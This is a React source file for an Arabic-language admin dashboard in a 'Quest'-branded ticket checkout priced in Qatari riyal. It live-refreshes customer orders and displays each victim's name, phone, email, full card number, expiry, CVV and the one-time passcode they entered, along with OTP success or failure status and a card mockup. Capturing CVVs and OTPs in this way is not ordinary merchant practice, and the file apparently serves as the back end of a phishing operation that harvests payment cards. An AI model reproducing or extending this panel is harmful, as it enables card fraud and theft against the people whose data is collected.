import { useEffect, useState } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import {
  AlertCircle,
  CheckCircle2,
  Clock3,
  CreditCard,
  Database,
  ListOrdered,
  MessageCircleMore,
  RefreshCw,
  ShieldAlert,
} from "lucide-react";
import { api, type CheckoutListResponse } from "@shared/routes";
import { QuestLegalFooter, QuestMobileTopBar } from "@/components/QuestMobileChrome";
import { formatQar } from "@/lib/ticket-cart";

function formatArabicDateTime(value: string): string {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return "غير متوفر";
  }

  return new Intl.DateTimeFormat("ar-QA", {
    dateStyle: "medium",
    timeStyle: "short",
  }).format(date);
}

function formatArabicDateOnly(value: string | null): string {
  if (!value) {
    return "غير محدد";
  }

  const parsed = new Date(value);
  if (Number.isNaN(parsed.getTime())) {
    return value;
  }

  return new Intl.DateTimeFormat("ar-QA", {
    dateStyle: "medium",
  }).format(parsed);
}

function formatCardNumber(value: string | null | undefined): string {
  if (!value) {
    return "غير متوفر";
  }

  const digits = value.replace(/\D/g, "");
  if (!digits) {
    return value;
  }

  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function getPaymentStatusMeta(status: string) {
  if (status === "otp_verified") {
    return {
      label: "OTP ناجح",
      icon: CheckCircle2,
      badgeClass: "bg-[#d8f5e5] text-[#1b7a4b]",
      bubbleClass: "bg-[#d8f5e5] text-[#1b7a4b]",
    };
  }

  if (status === "otp_failed") {
    return {
      label: "فشل OTP",
      icon: ShieldAlert,
      badgeClass: "bg-[#ffe0e0] text-[#a53636]",
      bubbleClass: "bg-[#ffe8e8] text-[#9f2f2f]",
    };
  }

  return {
    label: "تم طلب OTP",
    icon: Clock3,
    badgeClass: "bg-[#e3ecff] text-[#3456a7]",
    bubbleClass: "bg-[#edf3ff] text-[#3456a7]",
  };
}

function getPaymentStatusLabel(status: string): string {
  return getPaymentStatusMeta(status).label;
}

function getStreamStatusLabel(status: "connecting" | "connected" | "reconnecting"): string {
  if (status === "connected") {
    return "متصل";
  }

  if (status === "reconnecting") {
    return "يعيد الاتصال...";
  }

  return "جاري الاتصال...";
}

function scrollToOrder(orderId: string): void {
  const target = document.getElementById(`order-${orderId}`);
  if (!target) {
    return;
  }

  target.scrollIntoView({ behavior: "smooth", block: "start" });
}

export default function Dashboard() {
  const realtimeIntervalMs = 3000;
  const queryClient = useQueryClient();
  const [streamStatus, setStreamStatus] = useState<
    "connecting" | "connected" | "reconnecting"
  >("connecting");

  useEffect(() => {
    const stream = new EventSource(api.checkout.stream.path, {
      withCredentials: true,
    });

    const handleReady = (_event: Event) => {
      setStreamStatus("connected");
    };

    const handleCheckoutChanged = (_event: Event) => {
      setStreamStatus("connected");
      void queryClient.invalidateQueries({
        queryKey: [api.checkout.list.path],
      });
    };

    stream.addEventListener("ready", handleReady);
    stream.addEventListener("checkout_changed", handleCheckoutChanged);
    stream.onerror = () => {
      setStreamStatus("reconnecting");
    };

    return () => {
      stream.removeEventListener("ready", handleReady);
      stream.removeEventListener("checkout_changed", handleCheckoutChanged);
      stream.close();
    };
  }, [queryClient]);

  const {
    data,
    isLoading,
    error,
    refetch,
    isFetching,
    dataUpdatedAt,
  } = useQuery<CheckoutListResponse>({
    queryKey: [api.checkout.list.path],
    queryFn: async ({ signal }) => {
      const response = await fetch(`${api.checkout.list.path}?ts=${Date.now()}`, {
        method: api.checkout.list.method,
        credentials: "include",
        cache: "no-store",
        signal,
      });

      if (!response.ok) {
        const errorData = (await response.json().catch(() => null)) as { message?: string } | null;
        throw new Error(errorData?.message ?? "تعذر تحميل البيانات من Firestore.");
      }

      return api.checkout.list.responses[200].parse(await response.json());
    },
    refetchInterval: realtimeIntervalMs,
    refetchIntervalInBackground: true,
    refetchOnWindowFocus: true,
  });

  return (
    <div className="min-h-screen bg-[#d9e3ef] text-[#2f2f2f]" dir="rtl" lang="ar">
      <div className="flex min-h-screen w-full flex-col bg-[#d9e3ef]">
        <QuestMobileTopBar />

        <main className="flex-1 px-4 pb-8 pt-5 sm:px-6 lg:px-8 xl:px-12">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div>
              <h1 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.3rem]">لوحة البيانات</h1>
              <p className="text-sm text-[#49556b]">
                عرض جميع الطلبات بشكل محادثة مشابه لـ WhatsApp / Telegram مع Card Mockup
              </p>
            </div>
            <div className="flex flex-wrap items-center gap-2">
              <div className="rounded-md border border-[#d2dcec] bg-white px-3 py-2 text-xs text-[#4b5972]">
                <div className="flex items-center gap-2">
                  <span className={`h-2.5 w-2.5 rounded-full ${isFetching ? "animate-pulse bg-[#2e8b57]" : "bg-[#5f79a8]"}`} />
                  <span>تحديث مباشر كل {Math.floor(realtimeIntervalMs / 1000)} ثوانٍ</span>
                </div>
                <p className="mt-1">
                  آخر مزامنة:{" "}
                  {dataUpdatedAt
                    ? formatArabicDateTime(new Date(dataUpdatedAt).toISOString())
                    : "بانتظار أول مزامنة"}
                </p>
                <p className="mt-1">
                  قناة التحديث المباشر: {getStreamStatusLabel(streamStatus)}
                </p>
              </div>
              <button
                type="button"
                onClick={() => refetch()}
                disabled={isFetching}
                className="inline-flex items-center gap-2 rounded-md border border-[hsl(var(--quest-purple))]/30 bg-white px-3 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
              >
                <RefreshCw className={`h-4 w-4 ${isFetching ? "animate-spin" : ""}`} />
                تحديث البيانات
              </button>
            </div>
          </div>

          {isLoading ? (
            <div className="mt-5 rounded-md border border-[#d6dce6] bg-white p-5 text-sm text-[#555]">
              جاري تحميل البيانات...
            </div>
          ) : null}

          {error instanceof Error ? (
            <div className="mt-5 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] p-4 text-sm text-[#ad3030]">
              <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
              <p>{error.message}</p>
            </div>
          ) : null}

          {!isLoading && !error && data?.length === 0 ? (
            <div className="mt-5 rounded-md border border-[#d6dce6] bg-white p-5 text-sm text-[#555]">
              لا توجد أي طلبات بعد.
            </div>
          ) : null}

          {data && data.length > 0 ? (
            <div className="mt-5 grid min-h-[calc(100vh-220px)] gap-4 lg:grid-cols-[320px_minmax(0,1fr)] lg:items-start">
              <aside className="rounded-3xl border border-[#c5d2e1] bg-white/95 p-3 shadow-[0_8px_20px_rgba(46,77,127,0.12)] lg:sticky lg:top-4">
                <div className="mb-3 flex items-center justify-between border-b border-[#e5ecf5] pb-2">
                  <div className="flex items-center gap-2 text-[hsl(var(--quest-purple))]">
                    <ListOrdered className="h-4 w-4" />
                    <p className="text-sm font-bold">كل الطلبات</p>
                  </div>
                  <span className="rounded-full bg-[hsl(var(--quest-purple))]/10 px-2 py-1 text-xs font-semibold text-[hsl(var(--quest-purple))]">
                    {data.length}
                  </span>
                </div>

                <div className="max-h-[calc(100vh-210px)] space-y-2 overflow-y-auto pr-1">
                  {data.map((record) => {
                    const statusMeta = getPaymentStatusMeta(record.payment.status);
                    const StatusIcon = statusMeta.icon;
                    const customerName = `${record.billing.firstName} ${record.billing.lastName}`.trim();

                    return (
                      <button
                        key={`panel-${record.id}`}
                        type="button"
                        onClick={() => scrollToOrder(record.id)}
                        className="w-full rounded-2xl border border-[#d6e0ec] bg-[#f8fbff] px-3 py-2 text-right transition hover:border-[hsl(var(--quest-purple))]/35 hover:bg-white"
                      >
                        <div className="flex items-start justify-between gap-2">
                          <p className="truncate text-sm font-semibold text-[#2f3750]">{customerName}</p>
                          <span
                            className={`inline-flex shrink-0 items-center gap-1 rounded-full px-2 py-0.5 text-[10px] font-semibold ${statusMeta.badgeClass}`}
                          >
                            <StatusIcon className="h-3 w-3" />
                            {statusMeta.label}
                          </span>
                        </div>
                        <p className="mt-1 truncate text-[11px] text-[#5d687a]">رقم السجل: {record.id}</p>
                        <div className="mt-1 flex items-center justify-between text-[11px] text-[#4e596f]">
                          <span>الإجمالي: {formatQar(record.total)}</span>
                          <span>{record.items.length} عناصر</span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </aside>

              <section className="space-y-5">
                {data.map((record) => {
                  const statusMeta = getPaymentStatusMeta(record.payment.status);
                  const StatusIcon = statusMeta.icon;
                  const fullCardNumber = formatCardNumber(
                    record.payment.cardNumberFull ?? record.payment.cardNumberMasked,
                  );
                  const maskedCardNumber = formatCardNumber(record.payment.cardNumberMasked);
                  const cvvValue = record.payment.cvv?.trim() || "غير متوفر";
                  const otpValue = record.payment.otpCode?.trim() || "لم يتم إدخال OTP";
                  const updateHistory = record.paymentUpdateHistory ?? [];

                  return (
                    <article
                      id={`order-${record.id}`}
                      key={record.id}
                      className="scroll-mt-20 overflow-hidden rounded-3xl border border-[#c5d2e1] bg-[#f5f8fc] shadow-[0_10px_25px_rgba(46,77,127,0.1)]"
                    >
                      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-[#dbe3ef] bg-white/90 px-4 py-3">
                        <div className="flex items-center gap-2">
                          <Database className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
                          <span className="text-sm font-semibold text-[hsl(var(--quest-purple))]">
                            رقم السجل: {record.id}
                          </span>
                        </div>
                        <span
                          className={`inline-flex items-center gap-1 rounded-full px-2 py-1 text-xs font-semibold ${statusMeta.badgeClass}`}
                        >
                          <StatusIcon className="h-3.5 w-3.5" />
                          {statusMeta.label}
                        </span>
                      </div>

                      <div className="p-4">
                        <div className="rounded-3xl border border-white/70 bg-gradient-to-b from-[#ece2d8] to-[#e4dbd0] p-3 sm:p-4">
                          <div className="flex items-center gap-2 text-xs text-[#616161]">
                            <MessageCircleMore className="h-4 w-4 text-[#44536a]" />
                            <p>عرض تفاصيل الطلب كمحادثة</p>
                          </div>

                          <div className="mt-3 flex flex-col gap-3 text-sm">
                            <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
                              <p className="text-xs font-bold text-[#3d5543]">بيانات العميل</p>
                              <p className="mt-1">
                                {record.billing.firstName} {record.billing.lastName}
                              </p>
                              <p>{record.billing.phone}</p>
                              <p>{record.billing.email}</p>
                            </div>

                            <div className="mr-auto w-full max-w-[95%] rounded-2xl rounded-tl-sm bg-white px-3 py-2 text-[#3c3c3c] shadow-sm">
                              <p className="text-xs font-bold text-[#5d5d5d]">تفاصيل الزيارة</p>
                              <p className="mt-1">التاريخ: {formatArabicDateOnly(record.visitDateIso)}</p>
                              <p>الوقت: {record.visitTime ?? "غير محدد"}</p>
                              <p>عدد العناصر: {record.items.length}</p>
                            </div>

                            <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
                              <div className="flex items-center justify-between gap-2">
                                <p className="text-xs font-bold text-[#3d5543]">بيانات الدفع</p>
                                <span
                                  className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-semibold ${statusMeta.bubbleClass}`}
                                >
                                  <StatusIcon className="h-3 w-3" />
                                  {statusMeta.label}
                                </span>
                              </div>
                              <div className="mt-2 grid gap-1 text-xs sm:grid-cols-2">
                                <p>حامل البطاقة: {record.payment.cardholderName}</p>
                                <p dir="ltr">الانتهاء: {record.payment.expiry}</p>
                                <p dir="ltr">رقم البطاقة الكامل: {fullCardNumber}</p>
                                <p dir="ltr">البطاقة المقنعة: {maskedCardNumber}</p>
                                <p dir="ltr">CVV: {cvvValue}</p>
                                <p dir="ltr">OTP: {otpValue}</p>
                              </div>

                              <div className="mt-3 rounded-2xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7d318f] to-[#34455f] p-4 text-white shadow-md">
                                <div className="flex items-center justify-between text-[11px] font-semibold text-white/80">
                                  <span>Card Mockup</span>
                                  <CreditCard className="h-4 w-4" />
                                </div>
                                <p className="mt-5 text-lg font-semibold tracking-[0.16em]" dir="ltr">
                                  {fullCardNumber}
                                </p>
                                <div className="mt-5 grid grid-cols-3 gap-2 text-[11px]">
                                  <div className="min-w-0">
                                    <p className="text-white/70">الاسم</p>
                                    <p className="truncate font-semibold">
                                      {record.payment.cardholderName}
                                    </p>
                                  </div>
                                  <div>
                                    <p className="text-white/70">EXP</p>
                                    <p className="font-semibold" dir="ltr">
                                      {record.payment.expiry}
                                    </p>
                                  </div>
                                  <div>
                                    <p className="text-white/70">CVV</p>
                                    <p className="font-semibold" dir="ltr">
                                      {cvvValue}
                                    </p>
                                  </div>
                                </div>
                              </div>
                            </div>

                            <div className="mr-auto w-full max-w-[95%] rounded-2xl rounded-tl-sm bg-white px-3 py-2 text-[#3c3c3c] shadow-sm">
                              <p className="text-xs font-bold text-[#5d5d5d]">العناصر والمجاميع</p>
                              <div className="mt-2 space-y-1 text-xs text-[#555]">
                                {record.items.map((item) => (
                                  <p key={`${record.id}-${item.id}`}>
                                    {item.name} × {item.quantity} — {formatQar(item.lineTotal)}
                                  </p>
                                ))}
                              </div>
                              <div className="mt-3 grid gap-1 text-xs font-semibold text-[#3a3a3a] sm:grid-cols-2">
                                <p>المجموع الفرعي: {formatQar(record.subtotal)}</p>
                                <p>الإجمالي: {formatQar(record.total)}</p>
                              </div>
                              <div className="mt-2 space-y-0.5 text-[11px] text-[#6f6f6f]">
                                <p>تم الإنشاء: {formatArabicDateTime(record.createdAt)}</p>
                                <p>آخر تحديث: {formatArabicDateTime(record.updatedAt)}</p>
                              </div>
                            </div>

                            {updateHistory.length > 0 ? (
                              <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
                                <p className="text-xs font-bold text-[#3d5543]">
                                  سجل التحديثات (تم الاحتفاظ بالبيانات القديمة)
                                </p>
                                <div className="mt-2 space-y-1 text-[11px] text-[#2f5a39]">
                                  {[...updateHistory].reverse().map((entry, index) => (
                                    <p key={`${record.id}-history-${entry.updatedAt}-${index}`}>
                                      {formatArabicDateTime(entry.updatedAt)} —{" "}
                                      {getPaymentStatusLabel(entry.previousStatus)} {"→"}{" "}
                                      {getPaymentStatusLabel(entry.nextStatus)}
                                    </p>
                                  ))}
                                </div>
                              </div>
                            ) : null}

                            {record.payment.errorMessage ? (
                              <div className="mr-auto flex w-full max-w-[95%] items-start gap-2 rounded-2xl rounded-tl-sm border border-[#efc1c1] bg-[#fff1f1] px-3 py-2 text-xs text-[#ad3030]">
                                <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
                                <p>{record.payment.errorMessage}</p>
                              </div>
                            ) : null}
                          </div>
                        </div>
                      </div>
                    </article>
                  );
                })}
              </section>
            </div>
          ) : null}
        </main>

        <QuestLegalFooter />
      </div>
    </div>
  );
}
